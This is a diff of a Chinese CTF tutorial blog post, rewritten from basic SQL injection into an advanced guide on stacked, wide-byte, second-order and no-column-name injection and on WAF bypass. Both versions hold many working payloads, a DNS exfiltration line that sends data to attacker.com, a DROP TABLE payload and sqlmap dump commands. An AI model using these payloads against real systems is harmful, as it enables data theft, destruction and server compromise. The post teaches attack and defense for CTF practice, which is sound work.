@@ -1,443 +1,422 @@
 ---
-title: CTF Web：SQL 注入从入门到绕过 WAF
+title: SQL注入讲解—高级注入技术与WAF深度绕过
 date: 2026-09-12 16:00:00
 categories: [CTF, Web安全]
-tags: [CTF, Web, SQL注入, WAF绕过, 安全]
+tags: [CTF, Web, SQL注入, WAF绕过, 堆叠注入, 无列名注入]
 cover: /img/bg10.jpg
 ---
 
-## SQL 注入是什么
+## 从基础到高级的分水岭
 
-SQL 注入（SQL Injection）是 Web 安全中最经典、最持久的漏洞类型。当应用程序把用户输入直接拼接到 SQL 查询语句中，而没有做正确的过滤或参数化处理时，攻击者就可以通过构造恶意输入来篡改 SQL 语句的逻辑，从而读取、修改、删除数据库中的数据，甚至在某些情况下获取服务器权限。
+基础 SQL 注入（UNION 查询、布尔盲注、时间盲注、报错注入）是每个 Web 安全从业者的入门必修课。但在真实 CTF 比赛和渗透测试中，遇到的往往是更复杂的场景：关键字被过滤、WAF 拦截、堆叠注入、无列名注入、宽字节注入、二次注入、预编译绕过、MySQL 特性利用等。
 
-一个最基础的例子：
-
-```php
-// 存在漏洞的代码
-$id = $_GET['id'];
-$sql = "SELECT * FROM users WHERE id = $id";
-$result = mysqli_query($conn, $sql);
-```
-
-当用户访问 `?id=1` 时，执行的 SQL 是：
-```sql
-SELECT * FROM users WHERE id = 1
-```
-
-当用户访问 `?id=1 OR 1=1` 时，执行的 SQL 变成：
-```sql
-SELECT * FROM users WHERE id = 1 OR 1=1
-```
-
-`1=1` 恒为真，查询会返回 users 表中的所有记录——这就是最基础的 SQL 注入。
+本文聚焦高级 SQL 注入技术，假设读者已经掌握基础注入流程，重点讲解那些能在高手对决中拉开差距的技巧。
 
 <!-- more -->
 
-## 注入点分类
+## 堆叠注入的深度利用
 
-### 按注入位置分
+堆叠注入（Stacked Queries）允许用分号 `;` 在一条语句后拼接多条独立语句。是否可用取决于数据库驱动：PHP 的 `mysqli_multi_query()` 支持，`mysqli_query()` 不支持；Python 的 pymysql 默认不支持，但可以通过特定参数开启。
 
-- **GET 注入**：参数在 URL 中，如 `?id=1`
-- **POST 注入**：参数在请求体中，如登录表单
-- **Cookie 注入**：参数在 Cookie 中
-- **HTTP 头注入**：User-Agent、X-Forwarded-For、Referer 等头字段
-- **二阶注入**：注入 payload 先存入数据库，后续被另一个查询读取时触发
+### 场景 1：预编译绕过关键字过滤
 
-### 按数据类型分
+当 `select`、`from`、`where` 等关键字被严格过滤时，用预编译（PREPARE）拼接字符串执行：
 
-- **数字型**：`WHERE id = 1`，不需要引号闭合
-- **字符型**：`WHERE username = 'admin'`，需要用单引号闭合
-- **搜索型**：`WHERE name LIKE '%keyword%'`，需要闭合 `%'`
-
-## 基础注入流程
-
-### 1. 判断注入点
-
-```
-?id=1'          # 报错或页面异常 → 可能存在注入
-?id=1 and 1=1   # 页面正常
-?id=1 and 1=2   # 页面异常 → 确认数字型注入
-?id=1' and '1'='1  # 字符型测试
+```sql
+-- 基础预编译
+SET @sql = concat('SEL', 'ECT * FROM users');
+PREPARE stmt FROM @sql;
+EXECUTE stmt;
+DEALLOCATE PREPARE stmt;
 ```
 
-### 2. 判断列数（ORDER BY）
+### 场景 2：十六进制绕过
 
-```
-?id=1 ORDER BY 1--+    # 正常
-?id=1 ORDER BY 2--+    # 正常
-?id=1 ORDER BY 3--+    # 报错 → 列数为 2
-```
+当连字符串拼接都被过滤时，用十六进制表示完整的 SQL 语句：
 
-### 3. 判断回显位（UNION SELECT）
-
-```
-?id=-1 UNION SELECT 1,2--+
+```sql
+-- "SELECT * FROM users" 的十六进制
+SET @sql = 0x53454c454354202a2046524f4d207573657273;
+PREPARE stmt FROM @sql;
+EXECUTE stmt;
 ```
 
-注意把 id 改成不存在的值（如 -1），这样原查询返回空，UNION 的结果才会显示在页面上。
+### 场景 3：修改表结构注入 flag
 
-### 4. 爆数据库
+当目标是把 flag 写入一个可查询的表中时：
 
-```
-?id=-1 UNION SELECT 1,database()--+
-```
-
-### 5. 爆表名
-
-```
-?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+
+```sql
+-- 在已知表中添加一列，把 flag 写进去
+; ALTER TABLE users ADD COLUMN flag VARCHAR(100);
+; UPDATE users SET flag = (SELECT load_file('/flag')) WHERE id=1;
+-- 然后正常查询 users 表就能看到 flag
 ```
 
-### 6. 爆列名
+### 场景 4：HANDLER 语句绕过
 
-```
-?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+
-```
+MySQL 的 HANDLER 语句可以不通过 SELECT 直接打开表读取数据，当 `select` 被过滤时：
 
-### 7. 爆数据
-
-```
-?id=-1 UNION SELECT 1,group_concat(username,0x3a,password) FROM users--+
-```
-
-`0x3a` 是冒号 `:` 的十六进制，用来分隔用户名和密码。
-
-## 盲注技术
-
-当页面没有回显位，甚至连报错信息都没有时，就需要用盲注。
-
-### 布尔盲注
-
-根据页面返回的真假（正常/异常）来逐位猜解数据：
-
-```
-?id=1 AND LENGTH(database())=8--+   # 猜数据库名长度
-?id=1 AND SUBSTR(database(),1,1)='t'--+  # 猜第一个字符
+```sql
+; HANDLER users OPEN;
+; HANDLER users READ FIRST;
+; HANDLER users READ NEXT;
+; HANDLER users CLOSE;
 ```
 
-用二分法加速：
+## 无列名注入
 
-```
-?id=1 AND ASCII(SUBSTR(database(),1,1))>100--+
-```
+当 `information_schema` 被完全过滤，无法获取表名和列名时，需要无列名注入技术。
 
-### 时间盲注
+### 方法 1：JOIN 报错获取列名
 
-当页面连真假都不区分时，用 `SLEEP()` 或 `BENCHMARK()` 根据响应时间判断：
-
-```
-?id=1 AND IF(LENGTH(database())=8,SLEEP(5),0)--+
-```
-
-如果响应时间超过 5 秒，说明条件成立。
-
-MySQL 时间盲注常用函数：
-- `SLEEP(n)`：休眠 n 秒
-- `BENCHMARK(n, expr)`：重复执行 expr n 次
-- `IF(cond, true, false)`：条件判断
-
-### DNS 外带盲注（OOB）
-
-当布尔和时间盲注都太慢时，可以用 DNS 外带把数据带出来：
-
-```
-?id=1 AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))--+
+```sql
+-- 用 JOIN 产生列名冲突报错
+?sort=(SELECT * FROM users)a JOIN (SELECT * FROM users)b
+-- 报错信息：Duplicate column name 'id'
+-- 逐个获取所有列名
 ```
 
-需要一个可控的 DNS 服务器（如 ceye.io、dnslog.cn）来接收查询。
+### 方法 2：数字代替列名
 
-## 报错注入
+```sql
+-- 用反引号数字代替列名
+?sort=`1`  -- 第一列
+?sort=`2`  -- 第二列
 
-当页面显示数据库报错信息时，可以用报错注入把数据带出来。常用的报错函数：
-
-### updatexml / extractvalue
-
-```
-?id=1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+
-?id=1 AND extractvalue(1,concat(0x7e,(SELECT database())))--+
+-- 或者用 SELECT 1,2 UNION 的方式
+?id=-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--+
 ```
 
-`0x7e` 是 `~`，updatexml 遇到不合法的 XPATH 路径会报错，报错信息中包含我们拼接的数据。
+### 方法 3：无列名盲注
 
-注意：updatexml 最多显示 32 个字符，超过需要用 `SUBSTR` 分段。
-
-### floor 报错
-
-```
-?id=1 AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
+```sql
+-- 用整行比较来逐位猜解数据，不需要知道列名
+?id=1 AND (SELECT * FROM users LIMIT 1) > ('a',0,0,0,0,0)
+-- 逐列逐字符猜解
 ```
 
-原理是 `group by` + `rand()` 在特定条件下会产生主键重复报错。
+### 方法 4：sys 库替代 information_schema
 
-## 堆叠注入
+MySQL 5.7+ 有 `sys` 系统库，可以替代 information_schema：
 
-堆叠注入（Stacked Queries）允许在一条语句后用分号 `;` 拼接另一条完全独立的语句：
+```sql
+-- 查表名
+SELECT table_name FROM sys.schema_auto_increment_columns WHERE table_schema=database()
 
-```
-?id=1; DROP TABLE users--+
-```
-
-注意：堆叠注入是否可用取决于数据库驱动。PHP 的 `mysqli_multi_query()` 支持，但 `mysqli_query()` 不支持。Python 的 pymysql 默认也不支持多语句。
-
-堆叠注入常用操作：
-- 增删改查：`INSERT INTO users VALUES(...)`
-- 修改表结构：`ALTER TABLE users ADD COLUMN passwd VARCHAR(100)`
-- 预编译绕过：`SET @sql=concat('SEL','ECT ...'); PREPARE stmt FROM @sql; EXECUTE stmt;`
-
-## WAF 绕过技术
-
-### 1. 大小写绕过
-
-```
-?id=1 UnIoN SeLeCt 1,2--+
+-- 查索引
+SELECT * FROM sys.schema_index_statistics WHERE table_schema=database()
 ```
 
-WAF 用正则匹配 `union select` 时，大小写混合可以绕过（MySQL 不区分关键字大小写）。
+### 方法 5：innodb_table_stats
 
-### 2. 注释绕过
+MySQL 8.0+ 中 `information_schema` 被进一步限制时，可以用 InnoDB 的数据字典表：
 
-```
-?id=1 UNION/**/SELECT/**/1,2--+
-?id=1 UNION/*xxx*/SELECT/*xxx*/1,2--+
-```
-
-用注释符替换空格。
-
-### 3. 编码绕过
-
-- URL 编码：`%20` 代替空格，`%27` 代替单引号
-- 双重 URL 编码：`%2527`（有些 WAF 只解码一次）
-- Unicode 编码：`%u0027`
-- 十六进制：字符串用 `0x61646d696e` 代替 `'admin'`
-
-### 4. 等价函数绕过
-
-| 被过滤 | 替代方案 |
-|--------|----------|
-| `空格` | `/**/`、`%09`(tab)、`%0a`(换行)、`%0c`(换页)、`%0d`(回车)、括号 |
-| `=` | `LIKE`、`REGEXP`、`>`、`<`、`!=` |
-| `AND` | `&&` |
-| `OR` | `||` |
-| `UNION SELECT` | `UNION ALL SELECT` |
-| `SUBSTR` | `MID`、`SUBSTRING`、`LEFT` |
-| `DATABASE()` | `SCHEMA()` |
-| `GROUP_CONCAT` | `CONCAT_WS` |
-| `SLEEP()` | `BENCHMARK()` |
-| `information_schema` | `sys.schema_auto_increment_columns`、`mysql.innodb_table_stats` |
-
-### 5. 内联注释绕过
-
-```
-?id=1 /*!UNION*/ /*!SELECT*/ 1,2--+
+```sql
+SELECT NAME FROM mysql.innodb_table_stats WHERE database_name=database()
 ```
 
-MySQL 的内联注释 `/*! ... */` 中的内容会被 MySQL 执行，但其他数据库会忽略。有些 WAF 不识别这种语法。
+## 宽字节注入深度解析
 
-还可以带版本号：
-```
-?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2--+
-```
-`/*!50000 ... */` 表示 MySQL 版本 >= 5.00.00 时才执行。
+宽字节注入发生在数据库使用 GBK 等多字节编码，且应用层用 `addslashes()` 或 `magic_quotes_gpc` 转义单引号的场景。
 
-### 6. 预编译绕过
+### 原理
 
-当关键字被过滤时，用字符串拼接 + 预编译执行：
+`addslashes()` 会把单引号 `'`（0x27）转义为 `\'`（0x5c 0x27）。但在 GBK 编码中，`0xdf 0x5c` 是一个合法的 GBK 字符（運）。当输入 `%df'` 时：
 
-```
-?id=1; SET @sql=concat('SEL','ECT * FROM users'); PREPARE stmt FROM @sql; EXECUTE stmt;--+
-```
+1. `addslashes()` 把 `'` 转义为 `\'`，输入变成 `%df%5c%27`
+2. MySQL 用 GBK 解码时，`%df%5c` 被解释为一个 GBK 字符 `運`
+3. 剩下的 `%27`（单引号）逃逸出来，成功闭合
 
-也可以用十六进制：
-```
-?id=1; SET @sql=0x53454c454354202a2046524f4d207573657273; PREPARE stmt FROM @sql; EXECUTE stmt;--+
-```
-
-### 7. 异或注入
-
-```
-?id=1'^0--+
-```
-
-`^` 是异或运算符，可以用来绕过对 `and`、`or` 的过滤。
-
-### 8. 注入点在 HTTP 头
-
-有些 WAF 只检查 GET/POST 参数，不检查 HTTP 头：
-
-```
-User-Agent: 1' UNION SELECT 1,2--+
-X-Forwarded-For: 1' UNION SELECT 1,2--+
-Referer: 1' UNION SELECT 1,2--+
-```
-
-常见于日志记录功能把 HTTP 头存入数据库的场景。
-
-## 各数据库注入差异
-
-### MySQL
-
-- 注释：`-- `、`#`、`/**/`
-- 系统库：`information_schema`
-- 时间盲注：`SLEEP()`、`BENCHMARK()`
-- 报错注入：`updatexml()`、`extractvalue()`、`floor()`
-- 堆叠注入：取决于驱动
-- 读文件：`LOAD_FILE()`
-- 写文件：`INTO OUTFILE`、`INTO DUMPFILE`
-
-### MSSQL
-
-- 注释：`--`、`/**/`
-- 系统表：`sysobjects`、`syscolumns`
-- 时间盲注：`WAITFOR DELAY '0:0:5'`
-- 报错注入：`convert()`、`@@version`
-- 堆叠注入：默认支持
-- 提权：`xp_cmdshell`
-
-### Oracle
-
-- 注释：`--`、`/**/`
-- 系统表：`all_tables`、`user_tables`、`dual`
-- 时间盲注：`DBMS_LOCK.SLEEP()`
-- 报错注入：`utl_inaddr`、`ctxsys.drithsx.sn`
-- 必须用 `FROM dual` 才能 SELECT 常量
-- 不支持 `LIMIT`，用 `ROWNUM`
-
-### PostgreSQL
-
-- 注释：`--`、`/**/`
-- 系统表：`information_schema.tables`
-- 时间盲注：`pg_sleep()`
-- 报错注入：`CAST()` 类型转换错误
-- 堆叠注入：默认支持
-- 可执行系统命令（高权限时）
-
-## 高级注入技巧
-
-### 宽字节注入
-
-当数据库使用 GBK 编码，且 PHP 用 `addslashes()` 或 `magic_quotes_gpc` 转义单引号时：
+### payload
 
 ```
 ?id=1%df' UNION SELECT 1,2--+
 ```
 
-`%df` 和转义后的 `\'`（`%5c%27`）中的 `%5c` 组合成 GBK 字符 `運`，单引号 `%27` 逃逸出来，闭合成功。
+### 进阶：其他多字节编码
 
-### 二次注入
+- **GB2312**：类似 GBK，但合法字符范围不同
+- **BIG5**：繁体中文编码，同样存在宽字节问题
+- **Shift-JIS**：日文编码
 
-1. 第一步：注册用户，用户名为 `admin'--`，恶意 payload 被存入数据库
-2. 第二步：登录该用户，应用从数据库读取用户名并拼接到 SQL 中，payload 触发
+关键是找到一个高位字节（>0x80）和 `0x5c` 组合成合法字符的编码。
 
-二次注入的难点在于找到数据从输入到数据库再到查询的完整链路。
+## 二次注入的完整链路
 
-### 无列名注入
+二次注入（Second-Order SQL Injection）是指注入 payload 先被存入数据库，然后在另一个查询中被读取并拼接执行。它的难点在于找到数据从输入到数据库再到查询的完整链路。
 
-当 `information_schema` 被过滤，无法获取列名时：
+### 典型场景
 
-```
-# 用 JOIN 爆列名
-?id=-1 UNION SELECT * FROM (SELECT * FROM users a JOIN users b)c--+
+1. 用户注册时，用户名为 `admin'--`，被转义后存入数据库（数据库中存的是 `admin'--`）
+2. 用户登录后，应用从数据库读取用户名，拼接到另一个 SQL 中（如修改密码的查询）
+3. 此时用户名中的 `'--` 闭合了 SQL 语句，注入触发
 
-# 用数字代替列名
-?id=-1 UNION SELECT `1`,`2` FROM (SELECT 1,2 UNION SELECT * FROM users)a--+
-```
+### 利用示例
 
-### 无列名盲注
+```sql
+-- 注册用户名：admin'#
+-- 数据库中存储：admin'#
 
-```
-?id=1 AND (SELECT * FROM users LIMIT 1) > ('admin','x')--+
-```
-
-用整行比较来逐位猜解数据，不需要知道列名。
-
-## SQLMap 使用技巧
-
-sqlmap 是自动化 SQL 注入工具，但 CTF 中很多题需要手动调整参数。
-
-### 基础用法
-
-```bash
-# 检测注入
-sqlmap -u "http://target.com/?id=1"
-
-# 获取数据库
-sqlmap -u "http://target.com/?id=1" --dbs
-
-# 获取表
-sqlmap -u "http://target.com/?id=1" -D database_name --tables
-
-# 获取列
-sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --columns
-
-# dump 数据
-sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --dump
+-- 修改密码时的查询（存在漏洞）
+UPDATE users SET password='newpass' WHERE username='admin'#' AND password='oldpass'
+-- 实际执行：UPDATE users SET password='newpass' WHERE username='admin'
+-- # 后面的内容被注释，oldpass 检查被绕过
 ```
 
-### 常用参数
+### 挖掘方法
 
-```bash
---batch              # 自动确认所有提示
---level=5            # 测试级别 1-5，越高测试越全面
---risk=3             # 风险等级 1-3，越高越可能用危险 payload
---threads=10         # 多线程
---tamper=space2comment  # 使用绕过脚本
---proxy=http://127.0.0.1:8080  # 走代理
---random-agent       # 随机 User-Agent
---delay=1            # 请求延迟 1 秒
---time-sec=5         # 时间盲注的超时时间
+1. 追踪所有用户输入的存储位置
+2. 找到从数据库读取这些数据并拼接到 SQL 的地方
+3. 构造 payload，确保存储时不触发，但读取时触发
+
+## MySQL 特性利用
+
+### 1. 报错注入的高级用法
+
+#### updatexml 长度限制绕过
+
+updatexml 最多显示 32 个字符，超过需要分段：
+
+```sql
+-- 分段读取
+AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM users),1,31),0x7e),1)
+AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM users),32,31),0x7e),1)
 ```
 
-### 常用 tamper 脚本
+#### extractvalue 双写绕过
 
-- `space2comment`：空格替换为 `/**/`
-- `space2hash`：空格替换为 `#`+换行
-- `charencode`：URL 编码
-- `chardoubleencode`：双重 URL 编码
-- `unmagicquotes`：宽字节注入
-- `between`：用 `BETWEEN` 代替 `=`
-- `randomcase`：随机大小写
-- `comment`：在关键字中插入注释
-- `equaltolike`：`=` 替换为 `LIKE`
-- `ifnull2ifisnull`：`IFNULL` 替换为 `IF IS NULL`
+当 `updatexml` 被过滤时用 `extractvalue`，当两者都被过滤时：
 
-多个 tamper 用逗号分隔：`--tamper=space2comment,randomcase,charencode`
-
-## 防御方案
-
-### 1. 参数化查询（预编译）
-
-最根本的防御，把 SQL 语句结构和数据分开：
-
-```python
-# 正确做法
-cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
-
-# 错误做法
-cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+```sql
+-- 用 geometrycollection 等函数报错
+AND geometrycollection((SELECT * FROM (SELECT * FROM users)a))
+-- polygon、multipoint、linestring 等空间函数都可以报错
 ```
 
-### 2. 输入验证与过滤
+### 2. 布尔盲注的加速技巧
 
-- 白名单校验：数字型参数只允许数字
-- 长度限制
-- 类型检查
+#### 二分法 + 位运算
 
-### 3. 最小权限原则
+```sql
+-- 直接猜 ASCII 码的每一位，比逐字符快
+AND (SELECT ascii(substr(username,1,1)) FROM users LIMIT 1) & 1 = 1
+AND (SELECT ascii(substr(username,1,1)) FROM users LIMIT 1) & 2 = 2
+-- 8 次请求确定一个字符（2^8=256）
+```
 
-数据库账号只授予必要的权限，不要用 root 跑应用。禁止 `FILE`、`SUPER` 等危险权限。
+#### 正则盲注
 
-### 4. WAF
+```sql
+-- 用正则表达式逐位匹配
+AND (SELECT username FROM users LIMIT 1) REGEXP '^a'
+AND (SELECT username FROM users LIMIT 1) REGEXP '^ad'
+```
 
-部署 Web 应用防火墙作为纵深防御的一层，但不要依赖 WAF 作为唯一防御——WAF 可以被绕过，参数化查询才是根本。
+### 3. 时间盲注的替代方案
 
-### 5. 错误信息不回显
+当 `sleep()` 被过滤时：
 
-生产环境关闭详细错误信息，避免泄露数据库结构和注入点信息。
+```sql
+-- BENCHMARK
+AND IF(condition, BENCHMARK(10000000,MD5('a')),0)
+
+-- 笛卡尔积延时（大表 JOIN）
+AND IF(condition, (SELECT count(*) FROM information_schema.tables a, information_schema.tables b, information_schema.tables c),0)
+
+-- GET_LOCK 竞争
+AND GET_LOCK('a',5)  -- 如果锁被占用，等待 5 秒
+```
+
+### 4. DNS 外带（OOB）
+
+当布尔和时间盲注都太慢时，用 DNS 外带把数据带出来：
+
+```sql
+-- Windows 下用 LOAD_FILE 触发 DNS 查询
+AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))
+
+-- 用 select ... into outfile 配合 DNS
+-- 或者用 xp_cmdshell（MSSQL）
+```
+
+需要一个可控的 DNS 服务器（ceye.io、dnslog.cn）接收查询。
+
+## WAF 深度绕过
+
+### 1. 解析差异绕过
+
+WAF 和后端应用对同一个 HTTP 请求的解析可能不同，利用这种差异绕过：
+
+#### 参数污染（HPP）
+
+```
+?id=1&id=2 UNION SELECT 1,2--+
+```
+
+有些 WAF 取第一个参数（id=1），后端取第二个参数（id=2 UNION...）。
+
+#### 参数分块
+
+```
+?id=1 UNION/*&id=*/SELECT 1,2--+
+```
+
+WAF 看到的是 `id=1 UNION/*` 和 `id=*/SELECT 1,2--+`，都不完整；后端拼接后是完整的注入。
+
+#### HTTP 走私
+
+利用 CL.TE 或 TE.CL 的请求走私，让 WAF 和后端看到不同的请求体。
+
+### 2. 编码绕过
+
+#### Unicode 编码
+
+```
+?id=1%u0027%20UNION%u0020SELECT--+
+```
+
+有些 WAF 不解码 `%u` 编码，后端的 IIS/ASP 会解码。
+
+#### 双重 URL 编码
+
+```
+?id=1%2527%2520UNION%2520SELECT--+
+```
+
+WAF 解码一次看到 `%27`（不认为是单引号），后端解码两次看到 `'`。
+
+#### HTML 实体编码
+
+在某些上下文中（如搜索结果回显在 HTML 中），WAF 可能不解码 HTML 实体：
+
+```
+?id=1&apos; UNION SELECT 1,2--+
+```
+
+### 3. 语法混淆
+
+#### 大小写 + 注释混合
+
+```
+?id=1 UnIoN/*xxx*/SeLeCt/*yyy*/1,2--+
+```
+
+#### 关键字拆分
+
+```
+?id=1 UNI/**/ON SEL/**/ECT 1,2--+
+```
+
+#### 空白字符替代
+
+```
+?id=1%0bUNION%0cSELECT%091,2--+
+```
+
+`%09`(tab)、`%0a`(换行)、`%0b`(垂直tab)、`%0c`(换页)、`%0d`(回车) 都可以代替空格。
+
+### 4. 等价函数/语法替换
+
+| 被过滤 | 替代 |
+|--------|------|
+| `=` | `LIKE`、`REGEXP`、`!=`、`>`、`<` |
+| `AND` | `&&` |
+| `OR` | `||` |
+| `空格` | `/**/`、`%09`、括号 |
+| `SUBSTR` | `MID`、`SUBSTRING`、`LEFT` |
+| `DATABASE()` | `SCHEMA()` |
+| `GROUP_CONCAT` | `CONCAT_WS`、`CONCAT` |
+| `SLEEP()` | `BENCHMARK()` |
+| `information_schema` | `sys`、`mysql.innodb_table_stats` |
+| `SELECT` | `HANDLER`、预编译、`TABLE` |
+| `WHERE` | `HAVING`、`ORDER BY`、`LIMIT` |
+
+### 5. 内联注释绕过
+
+```sql
+?id=1 /*!UNION*/ /*!SELECT*/ 1,2--+
+?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2--+
+```
+
+MySQL 的内联注释 `/*! ... */` 中的内容会被 MySQL 执行，但 WAF 可能不识别。带版本号的 `/*!50000 ... */` 表示 MySQL >= 5.0.0 时执行。
+
+## 各数据库高级特性
+
+### MySQL
+
+- `LOAD_FILE()`：读文件（需要 FILE 权限和 secure_file_priv 配置）
+- `INTO OUTFILE` / `INTO DUMPFILE`：写文件（写 webshell）
+- `sys_exec()` / `sys_eval()`：UDF 执行系统命令
+- `xp_cmdshell`：MSSQL 的命令执行
+- `COPY ... FROM PROGRAM`：PostgreSQL 的命令执行
+
+### MSSQL
+
+- `xp_cmdshell`：执行系统命令
+- `xp_regread` / `xp_regwrite`：注册表操作
+- `OPENROWSET`：跨服务器查询
+- `sp_addlinkedsrvlogin`：链接服务器
+- `WAITFOR DELAY`：时间盲注
+- `convert()` 报错注入
+
+### PostgreSQL
+
+- `COPY ... FROM PROGRAM`：执行命令（9.3+）
+- `pg_read_file()`：读文件
+- `pg_ls_dir()`：列目录
+- `dblink`：跨数据库查询
+- `CREATE EXTENSION`：加载扩展
+
+### Oracle
+
+- `UTL_HTTP.REQUEST`：HTTP 请求（SSRF）
+- `DBMS_XSLPROCESSOR.READ2CLOB`：读文件
+- `DBMS_SCHEDULER`：执行命令
+- `XMLTYPE`：报错注入
+- 必须用 `FROM dual` 才能 SELECT 常量
+
+## 实战：无回显堆叠注入拿 flag
+
+这是一个典型的高级 CTF 场景：存在堆叠注入，但无回显，`select` 被过滤，`information_schema` 被过滤。
+
+### 解题思路
+
+1. 用堆叠注入修改表结构，把 flag 写入已知表
+2. 用报错注入或时间盲注读取数据
+3. 或者用 `LOAD_FILE` 直接读 flag 文件
+
+### payload
+
+```sql
+-- 1. 探测表结构（用 HANDLER 或报错）
+; HANDLER users OPEN; HANDLER users READ FIRST;
+
+-- 2. 如果知道有 users 表，添加 flag 列
+; ALTER TABLE users ADD COLUMN f VARCHAR(200);
+
+-- 3. 把 flag 写进去（用 load_file）
+; UPDATE users SET f = (SELECT load_file('/flag')) WHERE id=1;
+
+-- 4. 用报错注入读取 f 列
+1' AND updatexml(1,concat(0x7e,(SELECT f FROM users LIMIT 1),0x7e),1)--+
+```
+
+## 防御的本质
+
+SQL 注入的根本防御是**参数化查询（预编译）**，把 SQL 结构和数据分开。任何基于黑名单/过滤的防御都可以被绕过——因为 SQL 的语法太灵活，编码、注释、等价函数、数据库特性的组合无穷无尽。
+
+纵深防御：
+1. **参数化查询**：根本防御
+2. **输入验证**：白名单校验，数字型参数只允许数字
+3. **最小权限**：数据库账号只给必要权限，禁止 FILE、SUPER 等危险权限
+4. **WAF**：作为额外一层，但不依赖
+5. **错误信息不回显**：生产环境关闭详细错误
+6. **定期审计**：代码审计 + 动态扫描（SQLMap）
 
 ## 总结
 
-SQL 注入从 1998 年被首次公开到现在，已经存在了近 30 年，至今仍然在 OWASP Top 10 中名列前茅。它的变种层出不穷——从基础的 UNION 注入到盲注、报错注入、堆叠注入、二阶注入，再到各种 WAF 绕过技巧。
+高级 SQL 注入的核心是**理解数据库的内部机制和语法灵活性**。从堆叠注入的预编译绕过，到无列名注入的 JOIN 报错，从宽字节注入的编码特性，到二次注入的数据链路，每一种高级技术都是在利用数据库的某个特性或实现细节。
 
-掌握 SQL 注入的核心在于理解 SQL 语句的结构和数据库的特性。当你能在脑子里把用户输入拼接到 SQL 语句中，想象出最终执行的语句是什么样子时，注入点和绕过方法自然就浮现出来了。
+WAF 绕过的本质是**解析差异**——WAF 和后端对同一个请求的解析方式不同，利用这种差异让 WAF 看到的是无害内容，后端看到的是注入 payload。
 
-CTF 中的 SQL 注入题通常会组合多种过滤和绕过技巧，需要耐心测试。建议从基础题开始刷，逐步积累对各种数据库和绕过手法的手感。
+掌握高级 SQL 注入需要：深入理解各种数据库的特性、积累大量绕过 payload、培养对解析差异的敏感度。这是一个需要大量实战积累的领域，没有捷径。
